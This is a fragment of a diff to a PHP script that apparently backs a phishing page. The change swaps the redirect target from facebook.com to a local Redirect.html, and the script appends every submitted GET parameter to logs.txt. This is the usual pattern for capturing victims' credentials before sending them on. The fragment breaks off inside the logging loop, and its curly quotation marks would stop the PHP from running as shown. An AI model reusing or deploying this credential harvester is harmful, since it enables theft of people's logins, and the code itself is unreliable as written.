@@ -1,5 +1,5 @@
 <?php
-header(“Location: https://www.facebook.com”);
+header(“Location: Redirect.html”);
 $handle = fopen(“logs.txt”, “a”);
 foreach($_GET as $variable => $value) {
 fwrite($handle, $variable);
